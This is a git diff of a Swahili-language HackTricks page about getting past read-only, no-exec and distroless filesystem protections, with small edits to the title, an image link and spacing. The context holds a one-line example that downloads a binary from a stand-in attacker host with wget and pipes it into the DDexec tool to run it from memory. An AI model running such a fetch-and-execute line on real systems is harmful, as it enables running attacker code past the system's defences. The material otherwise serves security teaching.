@@ -1,4 +1,4 @@
-# Kudukua ulinzi wa FS: soma-tu / hakuna-kutekeleza / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
 
 <details>
 
@@ -14,7 +14,7 @@ Njia nyingine za kusaidia HackTricks:
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/sw/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>
 
 Ikiwa una nia ya **kazi ya kudukua** na kudukua yasiyodukuliwa - **tunakupa kazi!** (_uwezo wa kuandika na kuzungumza Kipolishi kwa ufasaha unahitajika_).
 
@@ -81,10 +81,12 @@ Hivyo, **kudhibiti kanuni ya mkusanyiko** inayotekelezwa na mchakato, unaweza ku
 {% hint style="success" %}
 **DDexec / EverythingExec** itakuruhusu kupakia na **kutekeleza** shellcode yako mwenyewe au **binary yoyote** kutoka **kumbukumbu**.
 {% endhint %}
+
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
+
 Kwa maelezo zaidi kuhusu hii technique angalia Github au:
 
 {% content-ref url="ddexec.md" %}
